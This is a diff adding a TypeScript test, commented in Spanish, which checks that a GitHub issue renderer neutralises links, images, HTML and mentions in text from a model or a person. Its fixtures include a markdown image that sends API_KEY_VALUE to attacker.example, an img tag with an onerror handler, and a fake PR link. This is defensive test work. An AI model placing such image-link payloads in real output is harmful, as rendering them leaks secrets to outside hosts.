@@ -82,6 +82,43 @@ test("hostile content cannot break the table, the block or the markers", () => {
 	assert.doesNotMatch(section, /<script>|^# título/m); assert.match(section, /&lt;script&gt;/);
 });
 
+// Lo que GitHub deja activo fuera del código: links, imágenes, autolinks, HTML, menciones y referencias.
+// Un code span es lo que va entre dos rachas de backticks del mismo largo, sin escapes adentro (CommonMark);
+// un carácter escapado con \ es literal.
+function outsideCode(line: string): string {
+	let rest = ""; let i = 0;
+	while (i < line.length) {
+		if (line[i] === "\\") { rest += "·"; i += 2; continue; }
+		const run = /^`+/.exec(line.slice(i))?.[0];
+		if (!run) { rest += line[i]; i++; continue; }
+		const close = new RegExp(`(?<!\`)${run}(?!\`)`, "g"); close.lastIndex = i + run.length;
+		const end = close.exec(line);
+		if (!end) { rest += run; i += run.length; continue; }
+		rest += " "; i = end.index + run.length;
+	}
+	return rest;
+}
+const ACTIVE = [/[[\]]/, /`/, /:\/\//, /www\./i, /@/, /#\d/, /gh-\d/i, /<(?!br>)/];
+test("text from the model, a command or the person cannot leave links, images, autolinks, HTML or mentions active", () => {
+	const hostile = "![x](https://attacker.example/c?d=API_KEY_VALUE) [click](https://attacker.example) <https://a.example> https://b.example/x?y=1 www.c.example ana@example.com @octocat @org/team <img src=x onerror=y> [r][ref] [^1] owner/repo#12 GH-7 x` @user `y \\`@z` fin\\";
+	const w = working(); w.recipe!.objective = hostile; w.recipe!.approach = hostile; w.recipe!.scope = [hostile]; w.recipe!.cases[0]!.description = hostile;
+	w.steps[0]!.title = hostile; w.spec!.playbook = [hostile];
+	w.inferences = [{ id: "I1", kind: "how", question: hostile, recommended: "x", confidence: 50, irreversible: false, references: [], resolution: "answered", answer: hostile }];
+	w.agreements = [{ quote: hostile, summary: "![x](https://attacker.example/c?d=API_KEY_VALUE) [click](https://attacker.example)", replan: false, phase: "implement", at: "now" }];
+	const section = renderIssueSection(w);
+	const lines = section.split("\n").filter((l) => l.includes("attacker") || l.includes("octocat"));
+	assert.equal(lines.length, 8, section);
+	for (const line of lines) for (const pattern of ACTIVE) assert.doesNotMatch(outsideCode(line), pattern, line);
+	assert.ok(section.includes(" → `![x](https://attacker.example/c?d=API_KEY_VALUE)` `[click](https://attacker.example)` _("), "la imagen y el link se ven como texto, sin cargarse ni enlazarse");
+	assert.match(section, /`@octocat`/); assert.match(section, /&lt;img/);
+	assert.match(section, /^- «`!\[x\]\(https:\/\/attacker\.example\/c\?d=API_KEY_VALUE\)` /m, "la cita de la persona también queda neutralizada");
+	// El PR que validó el harness sigue siendo un link; cualquier otro valor se muestra como código.
+	w.publication = { status: "opened", head: "a".repeat(40), url: "https://github.com/acme/repo/pull/8", number: 8 };
+	assert.match(renderIssueSection(w), /^\*\*PR draft:\*\* https:\/\/github\.com\/acme\/repo\/pull\/8$/m);
+	w.publication = { ...w.publication, url: "https://attacker.example/pull/8" };
+	assert.match(renderIssueSection(w), /^\*\*PR draft:\*\* `https:\/\/attacker\.example\/pull\/8`$/m);
+});
+
 test("a long evidence list is bounded and says so", () => {
 	const w = working(); w.evidence = Array.from({ length: 80 }, (_, i) => ({ ...w.evidence[0]!, id: `e${i}`, kind: "gate" as const, caseId: null, command: `gate ${i}` }));
 	const section = renderIssueSection(w);
